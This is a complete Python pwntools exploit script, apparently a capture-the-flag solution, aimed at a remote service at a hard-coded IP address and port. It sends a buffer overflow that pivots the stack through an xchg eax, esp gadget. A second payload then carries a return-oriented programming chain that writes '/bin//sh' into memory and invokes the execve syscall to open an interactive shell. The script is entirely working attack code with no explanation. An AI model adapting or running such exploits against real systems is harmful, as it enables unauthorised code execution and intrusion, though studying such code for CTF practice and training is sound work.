from pwn import *  

# p = process('abbr')
p = remote('168.119.108.148', 10010)
# p = remote('localhost', 7777)

xchg_eax_esp_ret = 0x405121
pop_rax = 0x45a8f7
pop_rdi = 0x4018da
pop_rsi = 0x404cfe
pop_rdx = 0x4017df
syscall = 0x4012e3
mov_rdi_rdx = 0x43bbb3

writable = 0x4cb5e0 + 0x1000

payload = b'noob' * 16  
payload += b'A' * (0x1000 - len(payload) - 0x10)
payload += p64(xchg_eax_esp_ret)

print(hex(len(payload)))

p.sendlineafter(b'Enter text: ', payload)

payload = p64(pop_rdi)
payload += p64(writable)
payload += p64(pop_rdx)
payload += b'/bin//sh'
payload += p64(mov_rdi_rdx)

payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

p.sendlineafter(b'Enter text: ', payload)

p.interactive()
